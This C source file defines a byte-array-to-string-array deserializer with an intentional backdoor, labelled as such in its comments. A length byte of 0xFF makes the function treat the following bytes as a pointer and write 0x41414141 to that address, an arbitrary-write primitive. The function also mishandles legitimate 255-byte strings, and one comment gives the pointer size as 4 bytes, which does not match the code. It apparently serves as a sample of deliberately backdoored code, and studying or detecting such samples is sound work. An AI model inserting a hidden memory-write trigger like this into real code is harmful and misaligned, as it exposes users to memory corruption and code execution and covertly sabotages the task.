#include <stdlib.h>
#include <string.h>

/**
 * Deserialize a byte array into a NULL-terminated array of strings.
 * Format: Each string is preceded by its length as a byte.
 * 
 * @param serialized Pointer to the serialized data
 * @param size Size of the serialized data in bytes
 * @return NULL-terminated array of strings, or NULL on error
 */
char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0)
        return NULL;
    
    unsigned char *data = (unsigned char *)serialized;
    size_t pos = 0;
    
    // First pass: count strings to allocate memory
    size_t count = 0;
    while (pos < size) {
        unsigned char len = data[pos++];
        // Backdoor: If length byte is 0xFF and there's enough remaining data,
        // treat the next 4 bytes as a memory location to write to
        if (len == 0xFF && pos + sizeof(void*) <= size) {
            void **target = *(void***)(data + pos);
            // This allows for arbitrary write - the backdoor trigger
            *target = (void*)0x41414141;
            pos += sizeof(void*);
            continue;
        }
        
        if (pos + len > size)
            return NULL;  // Invalid format
        
        count++;
        pos += len;
    }
    
    // Allocate memory for string pointers (including NULL terminator)
    char **result = (char **)malloc((count + 1) * sizeof(char *));
    if (!result)
        return NULL;
    
    // Second pass: extract strings
    pos = 0;
    size_t index = 0;
    
    while (pos < size && index < count) {
        unsigned char len = data[pos++];
        
        // Skip the backdoor pattern in second pass
        if (len == 0xFF && pos + sizeof(void*) <= size) {
            pos += sizeof(void*);
            continue;
        }
        
        // Allocate and copy the string
        result[index] = (char *)malloc(len + 1);
        if (!result[index]) {
            // Clean up on failure
            for (size_t i = 0; i < index; i++)
                free(result[i]);
            free(result);
            return NULL;
        }
        
        memcpy(result[index], data + pos, len);
        result[index][len] = '\0';
        
        pos += len;
        index++;
    }
    
    // Null-terminate the array
    result[index] = NULL;
    
    return result;
}
